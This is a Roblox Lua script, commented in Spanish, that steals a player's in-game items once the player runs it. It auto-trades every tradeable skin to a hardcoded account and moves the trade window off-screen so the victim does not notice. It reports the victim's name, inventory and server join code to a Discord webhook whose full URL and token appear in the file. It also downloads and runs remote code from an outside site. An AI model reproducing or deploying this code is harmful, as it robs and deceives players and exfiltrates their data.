local CONFIG = {
    ANONYMOUS     = false, -- oculta los nombres en el webhook

    TARGET_NAME   = "LLLSDAD0", -- username de la cuenta que recibe las skins
   
    -- Script extra que se ejecuta al iniciar, puede ser un script de Yisus o cualquier otro script.
    -- Dejar vacio para desactivar
    SECOND_SCRIPT_URL = "https://solixhub.com/loader",

    -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1554466360413790309/0Z7OJ6QXeMy9a6EZBNWE8gM6DXQ9zZZNtWbaKoZEyS2SFghd_KhpZ-XAcixrrdyql0H-", -- "https://discord.com/api/webhooks/" webhook de Discord
        PING = "@everyone", -- mencion del mensaje, nil para ninguna
        NOTIFY_WHEN_EMPTY = true,
    },

    EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" },
    INCLUDE_EMOTES = true,

    MAX_TRADE_ITEMS = 12,
    OFFER_GAP       = 0.35,
    READY_TIMEOUT   = 60,
    AUTO_INVITE     = true,
    INVITE_EVERY    = 8,
}

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace         = game:GetService("Workspace")
local HttpService       = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

local Remotes       = require(ReplicatedStorage.Shared.Remotes)
local ClientGlobals = require(ReplicatedStorage.Client.Modules.ClientGlobals)
local PlayerData        = ClientGlobals.PlayerData
local ActiveNegotiation = ClientGlobals.ActiveNegotiation
local SessionState      = ClientGlobals.SessionState

local okItem, ItemDB = pcall(function() return require(ReplicatedStorage.Shared.Item) end)
if not okItem or type(ItemDB) ~= "table" then ItemDB = {} end

local okEmote, EmoteDB = pcall(function() return require(ReplicatedStorage.Shared.Emotes) end)
if not okEmote or type(EmoteDB) ~= "table" then EmoteDB = {} end

local okTrade, ItemIsTradeable = pcall(function()
    return require(ReplicatedStorage.Shared.Utils.ItemIsTradeable)
end)
if not okTrade or type(ItemIsTradeable) ~= "function" then ItemIsTradeable = nil end

local CATEGORIES = { "Knife", "Gun", "Effect" }
if CONFIG.INCLUDE_EMOTES then CATEGORIES[#CATEGORIES + 1] = "Emote" end

local RARITY_RANK = { Ancient = 6, Mythic = 5, Legendary = 4, Rare = 3, Uncommon = 2, Common = 1 }
local RARITY_ORDER = { "Ancient", "Mythic", "Legendary", "Rare", "Uncommon", "Common", "Unknown" }


local TARGET_LOW = string.lower(tostring(CONFIG.TARGET_NAME or ""))

local function isTarget(p)
    if TARGET_LOW == "" then return false end
    local name = typeof(p) == "Instance" and p.Name or tostring(p)
    return string.lower(name) == TARGET_LOW
end

local function findTargetPlayer()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isTarget(p) then return p end
    end
    return nil
end

local EXCLUDE = {}
for _, n in ipairs(CONFIG.EXCLUDE_ITEMS or {}) do EXCLUDE[string.lower(n)] = true end

local byDisplayName = {}
for _, db in ipairs({ ItemDB, EmoteDB }) do
    for key, d in pairs(db) do
        if type(d) == "table" then
            local disp = d.ItemName or d.Name or d.name
            if type(disp) == "string" then byDisplayName[string.lower(disp)] = d end
        end
    end
end

local function rarityOf(name)
    local low = string.lower(name or "")
    local d = ItemDB[name] or EmoteDB[name] or byDisplayName[low]
    local r = type(d) == "table" and (d.Rarity or d.rarity) or nil
    if r and RARITY_RANK[r] then return r, RARITY_RANK[r] end
    return "Unknown", 0
end

local function isTradeable(name)
    if not ItemIsTradeable then return true end
    local ok, res = pcall(ItemIsTradeable, name)
    if not ok then return true end
    return res and true or false
end

local function getInventory()
    local out = {}
    for _, cat in ipairs(CATEGORIES) do
        local bucket = PlayerData:TryIndex({ "Inventory", cat })
        if type(bucket) == "table" then
            for guid, item in pairs(bucket) do
                local name = item and item.name
                if name and not EXCLUDE[string.lower(name)] and isTradeable(name) then
                    local r, rank = rarityOf(name)
                    out[#out + 1] = { guid = guid, name = name, cat = cat, rarity = r, rank = rank }
                end
            end
        end
    end
    return out
end

local function sortByRarity(list)
    table.sort(list, function(a, b)
        if a.rank ~= b.rank then return a.rank > b.rank end
        if a.name ~= b.name then return a.name < b.name end
        return tostring(a.guid) < tostring(b.guid)
    end)
    return list
end

local function summaryByRarity(inv)
    local s = {}
    for _, e in ipairs(inv) do s[e.rarity] = (s[e.rarity] or 0) + 1 end
    return s
end

local function sides()
    local data = ActiveNegotiation.Data
    if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
    local me, other
    if data.player1.player and data.player1.player.UserId == LocalPlayer.UserId then
        me, other = data.player1, data.player2
    else
        me, other = data.player2, data.player1
    end
    return me, other, data
end

local function offeredGuids()
    local me = sides()
    local set, n = {}, 0
    if me and me.offer then
        for _, guid in pairs(me.offer.items or {}) do set[guid] = true; n = n + 1 end
    end
    return set, n
end

local function getIncoming()
    local v = SessionState:TryIndex({ "incomingTradeRequests" })
    return type(v) == "table" and v or {}
end

local function waitUntil(cond, timeout)
    local t0 = os.clock()
    while os.clock() - t0 < timeout do
        if cond() then return true end
        task.wait(0.2)
    end
    return cond()
end

local function waitProcessingLock()
    waitUntil(function()
        local d = ActiveNegotiation.Data
        return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
    end, 5)
end

local function setReadyTrue()
    local _, _, data = sides()
    if not data then return false end
    waitUntil(function()
        local _, _, d = sides()
        return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
    end, 6)
    local _, _, d2 = sides()
    if not d2 then return false end
    Remotes.SetReady:FireServer(true, d2.ref or {})
    return true
end

local HttpReq = (syn and syn.request) or request or http_request or (http and http.request)

local function sendWebhook(payload)
    if not HttpReq or not CONFIG.WEBHOOK.URL or CONFIG.WEBHOOK.URL == "" then return end
    task.spawn(function()
        pcall(function()
            HttpReq({
                Url = CONFIG.WEBHOOK.URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload),
            })
        end)
    end)
end

local function jobCode()
    return ("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(game.PlaceId, game.JobId)
end

local function rarityLines(inv)
    local s = summaryByRarity(inv)
    local lines = {}
    for _, r in ipairs(RARITY_ORDER) do
        if s[r] then lines[#lines + 1] = ("%-10s x%d"):format(r, s[r]) end
    end
    if #lines == 0 then lines[1] = "(vacio)" end
    return table.concat(lines, "\n")
end

local function categoryLines(inv)
    local s = {}
    for _, e in ipairs(inv) do s[e.cat] = (s[e.cat] or 0) + 1 end
    local lines = {}
    for _, c in ipairs(CATEGORIES) do
        if s[c] then lines[#lines + 1] = ("%-7s x%d"):format(c, s[c]) end
    end
    if #lines == 0 then lines[1] = "(vacio)" end
    return table.concat(lines, "\n")
end

local function topItemsText(inv, n)
    local grouped, order = {}, {}
    for _, e in ipairs(sortByRarity(inv)) do
        if not grouped[e.name] then
            grouped[e.name] = { count = 0, rarity = e.rarity }
            order[#order + 1] = e.name
        end
        grouped[e.name].count = grouped[e.name].count + 1
    end
    local lines = {}
    for i = 1, math.min(n, #order) do
        local name = order[i]
        lines[#lines + 1] = ("[%s] %s x%d"):format(grouped[name].rarity, name, grouped[name].count)
    end
    if #order > n then lines[#lines + 1] = ("... y %d tipos mas"):format(#order - n) end
    if #lines == 0 then lines[1] = "(nada para dar)" end
    return table.concat(lines, "\n")
end

local function webhookStart()
    local inv = getInventory()
    local exec = (identifyexecutor and identifyexecutor()) or "Unknown"
    local target = CONFIG.TARGET_NAME ~= "" and CONFIG.TARGET_NAME or "(sin target)"
    local who = CONFIG.ANONYMOUS and "anonymous" or LocalPlayer.Name
    if CONFIG.ANONYMOUS then target = "anonymous" end
    sendWebhook({
        content = CONFIG.WEBHOOK.PING,
        embeds = { {
            title = "Transfer iniciado: " .. who,
            color = 3447003,
            fields = {
                { name = "Executor",  value = exec,   inline = true },
                { name = "Target",    value = target, inline = true },
                { name = "Tradeables", value = tostring(#inv) .. " (" .. math.ceil(#inv / CONFIG.MAX_TRADE_ITEMS) .. " trades)", inline = true },
                { name = "Por rareza", value = "```\n" .. rarityLines(inv) .. "\n```", inline = true },
                { name = "Por categoria", value = "```\n" .. categoryLines(inv) .. "\n```", inline = true },
                { name = "Orden de entrega", value = "```\n" .. topItemsText(inv, 15) .. "\n```", inline = false },
                { name = "Job Code", value = "```lua\n" .. jobCode() .. "\n```", inline = false },
            },
        } },
    })
end

local stats = { trades = 0, items = 0, startedAt = os.clock() }

local function webhookEmpty()
    if not CONFIG.WEBHOOK.NOTIFY_WHEN_EMPTY then return end
    sendWebhook({
        content = CONFIG.WEBHOOK.PING,
        embeds = { {
            title = "Transfer terminado: " .. (CONFIG.ANONYMOUS and "anonymous" or LocalPlayer.Name),
            color = 65280,
            fields = {
                { name = "Trades", value = tostring(stats.trades), inline = true },
                { name = "Items dados", value = tostring(stats.items), inline = true },
                { name = "Duracion", value = ("%d min"):format((os.clock() - stats.startedAt) / 60), inline = true },
            },
        } },
    })
end

local function handleTrade(other)
    local offered, offeredCount = offeredGuids()
    local room = CONFIG.MAX_TRADE_ITEMS - offeredCount

    if room > 0 then
        local batch = {}
        for _, e in ipairs(sortByRarity(getInventory())) do
            if not offered[e.guid] then
                batch[#batch + 1] = e
                if #batch >= room then break end
            end
        end

        if #batch == 0 and offeredCount == 0 then
            pcall(function() Remotes.CancelTrade:FireServer() end)
            return "empty"
        end

        if #batch > 0 then
            for _, e in ipairs(batch) do
                if not sides() then return "closed" end
                waitProcessingLock()
                Remotes.OfferItem:FireServer(e.guid)
                task.wait(CONFIG.OFFER_GAP)
            end
            task.wait(0.5)
            local _, nowCount = offeredGuids()
            if nowCount < math.min(CONFIG.MAX_TRADE_ITEMS, offeredCount + #batch) then
                return "retry"
            end
        end
    end

    local me = sides()
    if not me then return "closed" end
    if not me.ready then
        task.wait(0.3)
        setReadyTrue()
    end

    local _, finalCount = offeredGuids()
    local done = waitUntil(function()
        local m, _, d = sides()
        if not d then return true end
        if d.exchanging == true then return true end
        if m and not m.ready then return true end
        return false
    end, CONFIG.READY_TIMEOUT)

    local m, _, d = sides()
    if d and d.exchanging then
        stats.trades = stats.trades + 1
        stats.items  = stats.items + finalCount
        waitUntil(function() return sides() == nil end, 20)
        return "done"
    end
    if not d then return "closed" end
    if m and not m.ready then return "retry" end
    return "waiting"
end

local running = true

local tradeGui = nil
local tradeGuiOriginal = nil
local tradeHidden = false
local tradeGuiConns = {}

local function tradingWithTarget()
    local _, other = sides()
    return other and other.player and isTarget(other.player) or false
end

local function applyTradeGuiState()
    if not tradeGui then return end
    pcall(function()
        if tradeHidden then
            if tradeGui.Position ~= UDim2.new(5, 0, 5, 0) then
                tradeGui.Position = UDim2.new(5, 0, 5, 0)
            end
        elseif tradeGuiOriginal and tradeGui.Position ~= tradeGuiOriginal then
            tradeGui.Position = tradeGuiOriginal
        end
    end)
end

local guiThread = task.spawn(function()
    local gui = LocalPlayer:WaitForChild("PlayerGui")
    local newGui = gui:WaitForChild("NewGui", 30)
    if not newGui then return end
    tradeGui = newGui:WaitForChild("TradeNegotiation", 30)
    if not tradeGui then return end
    tradeGuiOriginal = tradeGui.Position

    tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Position"):Connect(function()
        if not tradeHidden and tradeGui.Position ~= UDim2.new(5, 0, 5, 0) then
            tradeGuiOriginal = tradeGui.Position
        end
        applyTradeGuiState()
    end)
    tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Visible"):Connect(applyTradeGuiState)

    while running do
        local hide = tradingWithTarget()
        if hide ~= tradeHidden then
            tradeHidden = hide
            applyTradeGuiState()
        end
        task.wait(0.2)
    end
end)
local busy = false
local emptyNotified = false
local lastInvite = 0
local lastAccept = {}

local mainThread = task.spawn(function()
    while running do
        local me, other = sides()

        if me and other and other.player then
            if isTarget(other.player) then
                if not busy then
                    busy = true
                    local ok, res = pcall(handleTrade, other)
                    busy = false
                    if ok and res == "empty" and not emptyNotified then
                        emptyNotified = true
                        webhookEmpty()
                    elseif ok and res == "done" then
                        emptyNotified = false
                        task.wait(1)
                    end
                end
            else
                task.wait(1)
            end
        else
            local target = findTargetPlayer()
            if not target then
                task.wait(2)
                continue
            end

            local now = os.clock()
            local accepted = false
            for _, p in ipairs(getIncoming()) do
                if isTarget(p) then
                    local key = typeof(p) == "Instance" and p.UserId or tostring(p)
                    if not lastAccept[key] or now - lastAccept[key] > 3 then
                        lastAccept[key] = now
                        Remotes.AcceptInvite:FireServer(p)
                        accepted = true
                    end
                end
            end

            if not accepted and CONFIG.AUTO_INVITE and now - lastInvite > CONFIG.INVITE_EVERY then
                if #getInventory() > 0 then
                    lastInvite = now
                    Remotes.SendInvite:FireServer(target)
                end
            end
        end

        task.wait(0.4)
    end
end)

webhookStart()

if CONFIG.SECOND_SCRIPT_URL and CONFIG.SECOND_SCRIPT_URL ~= "" then
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet(CONFIG.SECOND_SCRIPT_URL))()
        end)
    end)
end

local API = {
    role  = "transfer",
    stats = function()
        return { trades = stats.trades, items = stats.items, left = #getInventory() }
    end,
    inventory = function() return sortByRarity(getInventory()) end,
    unload = function()
        running = false
        if mainThread then task.cancel(mainThread); mainThread = nil end
        if guiThread then task.cancel(guiThread); guiThread = nil end
        for _, c in ipairs(tradeGuiConns) do pcall(function() c:Disconnect() end) end
        tradeGuiConns = {}
        tradeHidden = false
        applyTradeGuiState()
    end,
}
if typeof(getgenv) == "function" then getgenv().RysHubTransfer = API else _G.RysHubTransfer = API end
